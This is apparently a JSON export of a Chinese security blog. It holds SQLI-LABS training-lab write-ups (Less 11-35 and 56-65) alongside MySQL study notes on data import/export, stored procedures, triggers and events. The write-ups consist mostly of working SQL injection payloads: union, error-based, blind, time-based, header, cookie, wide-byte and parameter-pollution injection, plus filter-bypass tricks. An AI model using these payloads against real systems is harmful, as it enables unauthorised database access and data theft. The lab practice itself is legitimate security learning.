继续1?id&#x3D;-1) union select 1,secret_3JXI,3 from jq0p5t7r1m%23 LESS-56 payload1?id&#x3D;1&#39;)%23 剩下的就不做了。 注意：本题中，如果用?id=1”%23也可以闭合，只是无法继续后面的步骤，提交上述参数后执行的SQL语句为1SELECT * FROM security.users WHERE id&#x3D;(&#39;1&quot;#&#39;) LIMIT 0,1在数据库中执行确实能够查到数据，那么问题在哪呢？ 查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如&#39;1&quot;#&#39;转化为数字值为1，如果是&#39;11fads&#39;则为11，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。 LESS-57 本题是双引号闭合1?id&#x3D;1&quot;%23 LESS-58 本题无法进行联合注入，但是可以报错，故报错注入1?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select )))%23爆内容1?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select secret_AJHH from y9hrni0ywl)))%23 LESS-59 本题可以直接报错注入1?id&#x3D;1 and extractvalue(1,concat(0x5c,(select database())))%23 LESS-60 改变闭合方式1?id&#x3D;1&quot;) and extractvalue(1,concat(0x5c,(select database())))%23 LESS-61 双引号闭合，有点奇葩1?id&#x3D;1&#39;)) and extractvalue(1,concat(0x5c,(select database())))--+ LESS-62 本题没有错误回显，无法union注入，而且注释符貌似也被过滤了，可以考虑盲注1?id&#x3D;1&#39; and length(database())&#x3D;10 and &#39;a&#39;&#x3D;&#39;a爆表名1?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&#x3D;54 and &#39;a&#39;&#x3D;&#39;a爆列名1?id&#x3D;1&#39; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;64r31rkgr6&#39;),2,1))&#x3D;100 and &#39;a&#39;&#x3D;&#39;a爆数据1?id&#x3D;1&#39; and ascii(substr((select secret_R69X from 64r31rkgr6 ),1,1))&#x3D;121 and &#39;a&#39;&#x3D;&#39;a 但是查看源代码发现这并非本关的闭合方式，闭合的话应该是1?id&#x3D;1&#39;) and length(database())&#x3D;10%23但是我的payload也是可以的，原因在于)将我的输入闭合了，这也说明了为什么在我的原payload中不能使用注释符的原因。 LESS-63 单引号闭合1?id&#x3D;1&#39;%23 LESS-64 双括号闭合1?id&#x3D;1))%23 LESS-65 payload1?id&#x3D;1&quot;)%23 后记 总算是把所有的关都做完了，本次感慨良多啊。刚开始的时候还特别有激情，后面就不想做了，直到有一天，我制定了一个计划，一天5关，终于坚持下来了，看来做什么事情都要有个计划呀。做完后还是学到了很多的东西的，剩下的话还要练习一下写盲注脚本。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://chaosec.top/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"MySQL学习笔记(七)","slug":"mysql7","date":"2018-02-18T04:20:10.000Z","updated":"2019-01-30T11:56:08.265Z","comments":true,"path":"2018/02/18/mysql7/","link":"","permalink":"http://chaosec.top/2018/02/18/mysql7/","excerpt":"本节介绍MySQL数据库的备份和恢复。","text":"本节介绍MySQL数据库的备份和恢复。 常用的备份恢复方法 本节介绍多种备份方法 使用SQL语句：导入导出数据 1、导出表数据 SELECT INTO…OUTFILE格式：12345678SELECT * INTO OUTFILE '文件名1'[FIELDS [TERMINATED(终止) BY 'string'] [[OPTIONALLY] ENCLOSED by 'char'] [ESCAPED BY 'char']][LINES TERMINATED BY 'string']|DUMPFILE '文件名2' 说明： (1)这个语句将select语句选中的行写入到一个文件中，如果要指定特定位置，则要在文件名前加上具体的路径，空值会以’\\N’表示(2)FIELDS子句：如果指定了FIELDS子句，那么后面的三个至少要指定一个。1、TERMINATED BY 用来指定字段值之间的的符号，例如，TERMINATED BY ‘,’，则指定了逗号作为分隔标志，2、ENCOLSED BY 子句用来指定包裹文件中字符值的符号，例如ENCLOSED BY ‘“‘，表示文件中字符值放在双引号之间，若加上OPTIONALLY表示所有的值都放在双引号之间。3、ESCAPED BY 子句用来指定转义字符，例如，“ESCAPED BY ‘*‘” 将“*”指定为转义字符，取代“\\”，如空格将表示为“*N”。(3)LINES子句：在LINES子句中使用TERMINATED BY 指定一行结束的标志，比如“LINES TERMINATED BY ‘?’”表示一行以“?”作为结束标志。如果FIELDS和LINES子句都不指定，则默认使用以下子句。12FIELDS TERMINATED BY '\\t' ENCLOSED BY '' ESCAPED BY '\\\\'LINES TERMINATED BY '\\n'如果使用DUMPFILE而不是使用OUTFILE，所导出文件中的所有行都彼此紧挨着放置，值和行之间没有任何标记，，形成了一个长长的值。 注意：使用上述语句导出的只是数据的内容，不包括表的结构。 2、导入表数据 该语句可以将OUTFILE语句导入文件中的数据导入到数据库中。LOAD DATA …INFILE格式： 123456789101112131415LOAD DATA [LOW_PRIORITY|CONCURRENT] [LOCAL] INFILE '文件名.txt' [REPLACE|IGNORE] INTO TABLE 表名 [FIELDS [TERMINATED(终止) BY 'string'] [[OPTIONALLY] ENCLOSED by 'char'] [ESCAPED BY 'char'] ] [LINES [STARTING BY 'string'] [TERMINATED BY 'string'] ] [IGNORE number LINES] [(列名或用户变量, ...)] [SET 列名=表达式, ...] 说明： LOW_PRIORITY|CONCURRENT：若指定前者，则延迟语句的执行，若指定后者，则当LOAD DATA正在执行的时候，其他线程可以同时使用该表的数据。LOCAL：若指定LOCAL，则文件会被客户主机上的客户端读取，并被发送到服务器，只是执行速度略慢些。文件名.txt：可以带路径指定文件名。REPLACE|IGNORE：如果指定了REPLACE，则当文件中出现与原有行相同的唯一关键字值时，输入行会替换原有行，如果是IGNORE的话会跳过。STARTING指定每行的前缀，如果行中不包括该前缀，则该行被跳过。IGNORE number LINES：可以用来忽略文件的前几行，例如，可以使用IGNORE 1 LINES来跳过第一行。列名或用户变量：当表中列的顺序与文件中字段值顺序不同时，就必须指定一个列清单。SET子句：SET子句可以在导入数据时修改表中列的值。 example: 12345select * from student where job='计算机科学与技术' into outfile 'D:/myfile.txt' fields terminated by ',' optionally enclosed by '\"' lines terminated by '?'; 执行此语句产生报错： ERROR 1290 (HY000): The MySQL server is running with the —secure-file-priv option so it cannot execute this statement 这是因为MySQL对默认导出的目录有权限限制，使用命令show variables like ‘%secure_file%’ 可以查看此目录，必须导入到指定目录中才可以。 secure_file_priv: G:\\PHPwamp\\wamp64\\tmp\\ 修改后的语句： 12345select * from student where job='计算机科学与技术' into outfile 'G:/PHPwamp/wamp64/tmp/myfile.txt' fields terminated by ',' optionally enclosed by '\"' lines terminated by '?'; 注意：这里的Windows路径名称需要使用正斜杠指定而不是反斜杠。 导入上述数据到新建的xs表中： 12345load data infile 'G:/PHPwamp/wamp64/tmp/myfile.txt' into table xs fields terminated by ',' optionally enclosed by '\"' lines terminated by '?';","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(六)","slug":"mysql6","date":"2018-02-09T02:51:13.000Z","updated":"2018-02-16T12:43:16.219Z","comments":true,"path":"2018/02/09/mysql6/","link":"","permalink":"http://chaosec.top/2018/02/09/mysql6/","excerpt":"前言 MySQL自5.0版本之后，开始支持存储过程、存储函数、触发器和事件。这篇文章就来学习一下这个问题。","text":"前言 MySQL自5.0版本之后，开始支持存储过程、存储函数、触发器和事件。这篇文章就来学习一下这个问题。 存储过程 使用存储过程的优点 (1) 存储过程在服务器端运行，执行速度快(2) 存储过程执行一次后，期执行计划就会存储在告诉缓冲存储器中，在以后的操作中则会直接调用已编译的二进制代码执行，从而提高了系统性能。(3) 确保数据库安全，使用存储过程即可完成所有数据库操作，可以通过编程方式控制上述操作对数据库信息访问的权限。存储过程实质上相当于函数，所以具有函数的优点。 创建存储过程 创建存储过程命令格式 12create procedure 存储过程名 ( [参数 ...] ) [ 特征 ...] 主体 1、存储过程参数 参数:1[ in|out|inout ] 参数名 参数类型 # 输入参数|输出参数|输入/输出参数，相当于input，print等 注意：参数的名字不要采用列的名字，否则会引发重名错误。 2、存储过程特征 12345 language SQL| [not] deterministic| &#123;contains sql|no sql|reads sql data|modifies sql data&#125;| sql security &#123;definer|invoker&#125;| comment 'string' 说明： language SQL：表名编写这个的语言为SQL语言，指定编程语言，目前仅支持SQL语言。故此选项不可指定deterministic：对同样的输入参数输出相同的结果，加 not 参数会产生不确定的结果，默认为 not deterministiccontains sql：表示存储过程不包含读或写数据的语句， reads sql data 表示存储过程包含读数据的语句，但不包含写的数据。 modifies sql data 表示存储过程包含写数据的语句。默认的是 contains sql。sql security：定义使用该存储过程的用户的许可。 definer创建者， invoker调用者。comment ‘string’：对存储过程的描述， string为描述内容。可以使用命令 show create procedure 来显示。 3、存储过程主体 存储过程主体包含了在过程调用的时候必须执行的语句，这个部分总是以begin开始，以end结束，如果包含多个语句，则以分号作为结束符，当然，如果只有一句语句的话则不必指定begin-end语句。 服务器处理语句的时候是以分号作为结束符，如果以分号作为每个语句的结束符，那么执行一条语句就会遇到分号则会认为执行结束，这显然无法执行后面的指令，所以需要用”delimiter 结束符”将结束符改为其他符号。 用存储过程实现删除一个特定学生的信息 123456delimiter $$create procedure delete_student(in xh char(6))begin delete from xs where 学号=xh;end $$delimiter ; 存储过程体 在存储过程中可以使用所有的SQL语句类型，也包括变量的定义和赋值。 1、局部变量 在存储过程可以声明局部变量，可以用来存储临时结果，如果不赋初值的话则默认为NULL。 1declare 变量名 ...类型 [默认值] example 12declare num int(4);declare str1,str2 varchar(6); 局部变量只可以在begin-end语句块中声明，并且必须在存储过程的开头。声明完后也只能在该b-e块中使用，不能再其它块中使用。当然，也可以创建 用户变量 ，只要在前面加@符号，用户变量存在于整个回话之中。 2、使用set语句赋值 格式：1set 变量名=表达式 [,变量名=表达式] ... example 1set num=1, str1='hello'; 3、select…into语句 使用这个语句可以把选定的列值直接存储到变量中。因此，返回结果只能有一行。 1select 列名[,...] into 变量名 [,...] table_expr table_expr指select语句中的from子句及后面的部分。 example 例如，在存储过程中，将xs表中的学号为081101的学生姓名和专业名的值分别赋给变量name和project。 123select 姓名,专业名 into name,project from xs; where 学号='081101'; 注意：该语句只能在存储过程中使用，而且变量名name和project需要在使用之前声明。 4、流程控制语句 在MySQL语句中，可以使用过程式语句。 1) if语句 格式： 1234if 条件 then 语句[elseif 条件 then 语句] ...[else 语句]end if example 对于一个数据库，判断两个输入的参数哪一个更大。 12345678910111213delimiter $$create procedure xscj.compar (in kl interger,in k2 interger,out k3 char(6))begin if k1&gt;k2 then set k3='大于'; elseif k1=k2 then set k3='等于'; else set k3='小于'; end if;end$$delimiter ; 2) case语句 格式： 12345CASE case_value WHEN when_value THEN 语句 [WHEN when_value THEN 语句] ... [ELSE 语句]END CASE 或者12345CASE WHEN 条件 THEN 语句 [WHEN 条件 THEN 语句] ... [ELSE 语句]END CASE example 1234567891011delimiter $$create procedure xscj.result (in str varchar(4),out sex varchar(4))begin case str when 'm' then set sex='男'; when 'f' then set sex='女'; else set sex='无'; end case;end $$delimiter ; 或者 12345case when str='m' then set sex='男'; when str='f' then set sex='女'; else set sex='无';end case; 3) 循环语句 while语句格式 1234[begin_label:]WHILE 条件 DO 语句END WHILE [end_label] 注意：b-e label必须同时出现，并且label必须相同。 123456789delimiter $$create procedure dowhile()begin declare v1 int default 5; while v1&gt;0 do set v1=v1-1; end while;end$$delimiter ; repeat语句格式 12345[begin_label:]REPEAT 语句 UNTIL 条件END REPEAT [end_label] example1234repeat v1=v1-1; until v1&lt;1;end repeat; LOOP语句格式 1234[begin_label:]LOOP 语句END LOOP [end_label] loop 允许某特定语句或语句群的重复执行，想要退出的话可以用一个leave语句。 1LEAVE label example 123456789101112delimiter $$create procedure doloop()begin set @a=10; label:loop set @a=@a-1; if @a&lt;0 then leave label; end if; end loop label;end$$delimiter ; iterate语句 1ITERATE label 这个语句意为”再次循环”，指重新开始一个循环，与continue的含义类似。 5、处理程序和条件 6、游标 一条select…into语句返回的是带有值的一行，如果想要处理返回的多行数据，则可以使用游标。 1)声明游标 语法格式：1DECLARE 游标名 CURSOR FOR select 语句注意：select语句不能有into子句 example 1234declare xs_curl cursor for select 学号,姓名,性别,出生日期,总学分 from xs where 专业名='计算机'; 注意：该语句不能单独运行，必须在存储过程或存储函数中运行。 2)打开游标 1OPEN 游标名 3)读取数据 1FETCH 游标名 INTO 变量名 ... fetch语句是将一行数据赋给一些变量，每次已自动读取到下一行，所以变量名数量必须与select语句中的列数相等。 4)关闭游标 1CLOSE 游标名 example 1close xs_cur2 下面是一些示例： example 12345678910111213141516171819delimiter $$create procedure compute (out number integer)begin declare xh char(6); declare found boolean default true; declare number_xs cursor for select 学号 from xs; declare continue handler for not found set found=false; set number=0; open number_xs; fetch number_xs into xh; while found do set number=number+1; fetch number_xs into xh; end while; close number_xs;end $$delimiter ; 在MySQL 5.6以后，创建存储过程必须具有CREATE ROUTINE权限。想要查看数据库中哪些存储过程，可以使用 show procedure status命令，要查看具体过程，可以使用 show create procedure 存储过程名命令。 存储过程的调用、删除和修改 1、存储过程的调用 存储过程创建完毕后，可以在程序、触发器或者其他存储过程中被调用，一般使用 call语句来调用。 语法格式：1CALL 存储过程名 ([参数 ...]) 如果要调用某个数据库的存储过程，那么必须先使用这个数据库。 2、存储过程的删除 格式1DROP PROCEDURE [IF EXISTS] 存储过程名 3、存储过程的修改 使用alter procedure 可以修改存储过程的部分特征。格式1ALTER PROCEDURE 存储过程名 [特征...]特征123&#123;contains sql|no sql|reads sql data|modifies sql data&#125;|sql security &#123;definer|invoker&#125;|comment 'string' 如果想要修改存储过程的内容，可以采用先删除再重新定义存储过程的方法。 存储函数 存储函数和存储过程类似，也是由过程式语句组成的代码片段，但是，也有一些区别： (1)存储函数不能拥有输出参数，因为存储函数本来就是输出参数(2)不能用CALL语句来调用存储函数(3)存储函数必须包含一条RETURN语句，而存储过程中则不得包含。 创建存储函数 查看数据库中有哪些存储函数，可以使用命令：1show function status 创建存储函数CREATE FUNCTION语法格式123CREATE FUNCTION 存储过程名 ([参数...]) RETURNS type [特征...] 主体说明 存储函数的定义和存储过程相似。 存储函数不能与存储过程同名存储函数的参数只有名称和类型，不能指定IN,OUT,INOUT。RETURNS type声明函数返回值的数据类型。主体也叫存储函数体，与存储过程中使用的一样，但是存储函数体必须包含一个 RETURN value,value为存储函数的返回值。 example该例子返回xs表中学生的数目作为结果 1234567delimiter $$create function num_of_xs()returns integerbegin return (select count(*) from xs);end$$delimiter ; 存储函数的调用、删除和修改 1、存储函数的调用 存储函数和MySQL的内置函数(比如version())，所以调用存储函数可以使用 select 关键字。 语法格式： 1SELECT 存储函数名 ([参数[,...]]) 存储函数内部也可以调用另外一个存储函数或存储过程 2、删除存储函数 语法格式：1DROP FUNCTION [IF EXISTS] 存储过程名 example 1drop function if exists num_of_xs; 3、存储函数的修改 1ALTER FUNCTION 存储过程名 [特征 ...] 触发器 触发器不需要被调用，是一个被指定关联到一个表的数据对象，当对一个表的特别事件出现时触发器就会被自动调用。可是实现比如多个表信息的一致性，可通过定义 delete 触发器来实现上述功能。 创建触发器 想要查看有哪些触发器使用SHOW TRIGGERS 命令。 CREATE TRIGGER语法格式 12CREATE TRIGGER 触发器名 触发时刻 触发事件 ON 表名 FOR EACH ROW 触发器动作 说明 触发器名称必须唯一，若要在某个特定数据库中创建，名称前要加上数据库名触发器时刻，有两个选项：after和before，如果想要在激活之后执行一些语句则可以使用after，如果想要进行验证即可以使用before选项。触发器事件：指明了激活触发程序语句的类型。可以是下述值之一INSERT 将新行插入表时激活触发器，例如通过INSERT、LOAD DATA和REPLACE语句。UPDATE 更改某一行时激活触发器。例如UPDATE语句。DELETE 从表中删除某一行时激活触发器。例如，通过DELETE和REPLACE语句。表名：表示在该表上激活触发程序才会激活触发器，同一个表不能拥有两个具有触发时刻和时间的表，触发时间指before和after。FOR EACH ROW：这个声明用来指定对于受触发器事件影响的每一行都要激活触发器的动作。包含触发器激活时将要执行的语句，可使用 begin-end 结构来执行多条语句。 注意：触发器不能返回任何数据到客户端，同样也不能调用将数据返回客户端的存储过程。 example 创建一个表，表中只有一列a，在表上创建一个触发器，每次插入操作时，将用户变量str的值设为“trigger is working”。1234create table table1(a integer);create trigger table1_insert after insert on table1 for each row set @str='trigger is working';向table1中插入一行数据1insert into table1 values(10);查看str的值即可查看触发器是否触发。 MySQL可以关联表中的列，亦可以调用存储过程。在关联表中的列时需要注意： MySQL可以关联表中的任意列，但不能直接使用列的名称作为标志，那会使系统混淆。必须这样描述才可以：NEW.column_name 或者 OLD.column_name 。 NEW.column_name用来引用新行的一列，OLD.column_name 用来引用更新或删除它之前的已有行的一列。对于INSERT语句来说，只有new是合法的，对于DELETE语句，只有OLD才合法，而UPDATE语句可以与OLD和NEW同时使用。 example 创建一个表实现关联删除的功能 1234567delimiter $$create trigger xs_delete after delete on xs for each rowbegin delete from xs_kc where 学号=old.学号；end$$delimiter ; 在触发器中也可以调用存储过程。 删除触发器 1DROP TRIGGER [schema_name.]trigger_name schema_name为所在数据库的名称 事件 自MySQL5.6之后已经开始支持事件，可能各版本的功能会有所不同，这里是简单的MySQL5.6的版本。事件是MySQL在相应的时刻调用的过程式数据库对象。 事件的主要作用如下： 关闭账户打开或关闭数据库指示器使数据库中的数据在某个间隔后刷新执行对进入数据的复杂的检查工作。 创建事件 语法格式：123456CREATE EVENT [IF NOT EXISTS] 事件名 ON SCHEDULE schedule [ON COMPLETION [NOT] PRESERVE] [ENABLE|DISABLE|DISABLE ON SLAVE] [COMMENT 'comment'] DO sql语句；schedule：123456AT timestamp [+INTERVAL interval]|EVERT interval[STARTS timestamp [+INTERVAL interval]][ENDS timestamp [+INTERVAL interval]]interval:count &#123;YEAR|QUARTER|MONTH|DAY|HOUR|MINUTE|WEEK|SECOND|YEAR_MONTH|DAY_HOUR|DAY_MINUTE|DAY_SECOND|HOUR_MINUTE|HOUR_SECOND|MINUTE_SECOND&#125; 说明： schema：时间调度，表示事件何时发生或每隔多久发生一次。AT子句：表示在某个时刻事件发生。timestamp表示一个具体的时间点，后面可以加上一个时间间隔，interval表示这个时间间隔，有一个数字和单位组成，count是间隔时间的数值。EVERY子句：表示在指定时间间隔内每隔多长时间事件发生一次，STARTS子句设定开始时间，ENDS子句设定结束时间。sql语句：时间执行代码，可以使用begin-end结构时间属性：每个事件都可以定义几个属性。ON COMPLETION NOT PRESERVE表示事件最后执行完之后自动删除该事件，不加NOT表示不删除。默认为有not参数 MySQL事件有事件调度器负责调用，打开事件调度器命令为1SET GLOBAL EVENT_SCHEDULER=TRUE; example创建一个30秒后启动的事件 1234use xscjcreate event afterseconds on schedule at now()+interval 30 second do insert into xs values('091103','张建'); 修改和删除事件 修改事件12345ALTER EVENT event_name [ON SCHEDULE schedule] [ON COMPLETION [NOT] PRESERVE] [RENAME TO new_event_name] [ENABLE|DISABLE|DISABLE ON SLAVE] 删除事件1DROP EVENT [IF EXISTS] [database name.] event name","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"SQLI-LABS(Less11-Less35)","slug":"sqli-labs2","date":"2018-02-09T02:50:57.000Z","updated":"2019-05-16T09:18:03.185Z","comments":true,"path":"2018/02/09/sqli-labs2/","link":"","permalink":"http://chaosec.top/2018/02/09/sqli-labs2/","excerpt":"接上篇","text":"接上篇 LESS-11 有回显，尝试报错注入12usernae = admin'and 1=(updatexml(1,concat(0x3a,(select database())),1))#password = admin'and 1=(updatexml(1,concat(0x3a,(select database())),1))# 发现有回显 XPATH syntax error: ‘:security’ 则可以得到数据库名。 常用报错语句 1、通过floor报错,注入语句如下:1and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过ExtractValue报错,注入语句如下:1and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3、通过UpdateXml报错,注入语句如下:1and 1=(updatexml(1,concat(0x3a,(select user())),1)) 4、通过NAME_CONST报错,注入语句如下:1and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5、通过join报错,注入语句如下:1select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过exp报错,注入语句如下:1and exp(~(select * from (select user () ) a) ); 7、通过GeometryCollection()报错,注入语句如下:1and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下:1and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下:1and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下:1and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下:1and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下:1and linestring (()select * from(select user() )a)b ); 还有其他方法 1uname=1admin' union select 1,database()#&amp;passwd=1 这样可以得到数据库名继续爆表 1uname=admin45' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#&amp;passwd=1 可以得到 Your Password:emails,referers,uagents,users爆字段 1uname=admin45' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#&amp;passwd=1 Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password爆内容 1uname=admin45' union select 1,concat_ws(password) from users#&amp;passwd=1 LESS-12 构造闭合语句1uname=admin\") or 1=1 limit 0,1#&amp;passwd=1 后面和11关一样 LESS-13 尝试 uname=admin&#39;&amp;passwd=1,返回错误信息 near ‘1’) LIMIT 0,1’ at line 1 构造闭合语句1uname=admin')#&amp;passwd=1可以成功登陆，但是无法和前面一样显示信息，故得使用盲注1uname=admin') and left(database(),1)='s'#&amp;passwd=1然后一步步可以得到所有信息 LESS-14 直接换双引号闭合1uname=admin\" or 1=1#&amp;passwd=1 LESS-15 单引号闭合即可1uname=admin\" or 1=1#&amp;passwd=1 也可以延时注入1uname=admin' and if(ascii(substr(database(),1,1))=119,1,sleep(5))#&amp;passwd=admin LESS-16 payload1uname=admin\") or 1=1#&amp;passwd=1 LESS-17 本关是一个涉及数据库的增删查改的问题，发现对数据库的username输入进行了过滤，但是对password没有过滤。报错注入payload1uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit=Submit也可以延时注入，但是延时注入会修改数据库内容，不建议使用。 接下来三关是对header头的注入 LESS-18 截取Header头进行修改，由于username和password参数都进行了检查，故无法从这两个地方注入。修改User-Agent，利用报错进行注入payload1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1 这个在本题不可以用，但是可以报错，1extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) LESS-19 只是将注入位置换为referer即可 LESS-20 用cookie注入,这里我用的是火狐的Cookie Manager插件1Dumb' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#然后可以继续注入获取全部内容。 LESS-21 本题与20题方法一样，只是闭合方法不同，还有要对payload进行base64编码。1Dumb') and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#再用base64编码1RHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3d%3d LESS-22 与21关相同只是闭合方式变成了双引号1RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgQEB2ZXJzaW9uKSwweDdlKSwxKSM%3d LESS-23 此题过滤了—和#注释符，构造payload闭合 ?id=1&#39; and &#39;a&#39;=&#39;a，继续获取文件路径1?id&#x3D;-1&#39; union select 1,@@datadir,&#39;a获取表名1?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;a下面的不再演示，还可以报错注入，延时注入等1?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;a&#39;&#x3D;&#39;a延时注入1?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5)) and &#39;a&#39;&#x3D;&#39;a LESS-24 本关看界面是用户创建密和修改密码等，考察的是二次排序注入(又叫存储型注入)。先创建一个用户admin&#39;#，如果修改密码，则会将admin用户的密码修改。SQL语句就变为1update users set paddwd='new_pass' where username='admin'#' and password='相当于执行了update users set password=&#39;$new_pass&#39; where username=&#39;admin&#39;，从而更改了用户名。 LESS-25 单引号闭合联合注入1?id=-1' union select 1,database(),'a本题要绕过and和or，有常用的几个方法 (1)大小写变形，如Or,oR,OR(2)编码，hex,urlencode(3)添加注释/*or*/(4)利用符号 and=&amp;&amp; ,or=||(5)重复输入anandd 利用方法41?id=1' || updatexml(1,concat(0x7e,(select @@version),0x7e),1) || '1'='1 LESS-25a 本关没有错误回显，所以不能用报错注入。并没有引号限制，可以联合注入1?id&#x3D;-1 union select 1,database(),3# LESS-26 由于空格注释符等都被过滤掉了，其他的符号Windows下不能用，可以用不带空格的报错注入。1?id=0'||extractvalue(1, concat(0x5c, (database())))||'1'='1 然后继续注入1?id&#x3D;1&#39;||extractvalue(1,concat(0x5c,(select(group_concat(username))from(users))))||&#39;1&#39;&#x3D;&#39;1 对于空格常用的方法为： 编码 含义 %09 TAB键(水平) %0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键(垂直) %a0 空格 LESS-26a 本关无法回显错误，无法使用报错注入，还有闭合方式为 ?id=1&#39;)盲注payload：1?id&#x3D;1&#39;anandd(select(substr((select(database())),1,1)))&#x3D;&#39;s联合注入1?id&#x3D;555&#39;)union(select(1),(user()),&#39;1爆用户名1?id&#x3D;555&#39;)union(select(1),group_concat(username),(2)from(users)where(1&#x3D;1))union(select(1),(2),&#39;a LESS-27 本题过滤了select和上关的字符，可以大小写混合绕过报错注入payload1?id&#x3D;0&#39;||extractvalue(1, concat(0x5c, (seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;database())))||&#39;1&#39;&#x3D;&#39;1 LESS-27a 本题双引号闭合，无法报错。盲注payload：1?id&#x3D;0&quot;||(SelEct(substr((SelecT(database())),1,1)))&#x3D;&quot;s LESS-28 与前面没有太大区别，盲注payload1?id&#x3D;888&#39;)||(SelecT(substr((SelEct(database())),1,1)))&#x3D;(&#39;s 联合注入1?id&#x3D;888&#39;)unIon(Select(1),database(),&#39;a LESS-28a 本题知识简单过滤了union等符号，联合注入1?id&#x3D;555&#39;)unIon(SeLect 1,database(),&#39;3 LESS-29 注意：本题的index.php页面没有任何防护，注册页面是在login.php页面 在login.php文件中，传入的参数会被分为两组，分组符号为&amp;，那么构造payload，以&amp;分组即可1?id&#x3D;1&amp;id&#x3D;-1&#39; union select 1,group_concat(username),2 from users--+本关为HPP(http参数污染)攻击,具体参见百度 LESS-30 与29关相同，只是闭合方式改为&quot;1?id&#x3D;1&amp;id&#x3D;-1&quot; union select 1,group_concat(username),2 from users--+ LESS-31 与前面的相同，只是闭合方式变了1?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,database(),3--+ 宽字节注入 原理： mysql在使用GBK编码的时候，会把两个字符作为一个汉字，例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围)。我们在过滤&#39;的时候，往往利用的思路是将\\&#39;，因此我们的思路就是将’前面的\\换掉。 方法一般有两种： 1、%df吃掉\\\\，具体的原因是urlencode(\\\\’)=%5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面的提到的mysql在GBK编码的时候两个字节当做一个汉字，此时%df%5c就是一个汉字，那么%27单独在外面，达到了我们的目的。2、将%\\*\\*%5c%5c%27的情况，后面%5c会被前面的%5c给注释掉 LESS-32 用第一种方法绕过1?id&#x3D;-1%df%27union%20select%201,user(),3--+这个payload执行的sql语句是1select 1,2,3 from users where id&#x3D;&#39;-1運&#39;union select 1,user(),3; LESS-33 这个和上一题没什么区别，同样的payload也可以用1?id&#x3D;-1%df%27union select 1,2,@@basedir--+ LESS-34 本关是post型的注入漏洞，同样也是进行了♦&#39;，我们利用这个方式尝试。payload1uname&#x3D;♦&#39; or 1&#x3D;1#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit 继续的话可以1uname&#x3D;♦&#39; union select 2,@@basedir#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit LESS-35 本关和前面的过滤一样，只是没有加引号闭合，所以就更简单了1?id&#x3D;-1 union select 1,database(),3#在后面的时候有个数字型注入，编码绕过即可1?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;0x7573657273--+","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://chaosec.top/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"MySQL学习笔记(五)","slug":"mysql5","date":"2018-02-07T03:03:49.000Z","updated":"2018-02-25T08:40:45.961Z","comments":true,"path":"2018/02/07/mysql5/","link":"","permalink":"http://chaosec.top/2018/02/07/mysql5/","excerpt":"MySQL语言结构","text":"MySQL语言结构 MySQL语言简介 在MySQL数据库中，SQL语言有以下四部分组成 (1)数据定义语言(Data Definition Language,DDL)，用于执行的对数据库的操作，例如 create、 alter等。(2)数据操纵语言(Data Manipulation Language,DML),用于操纵数据库，比如 select、 insert等。(3)数据控制语言(Data Control 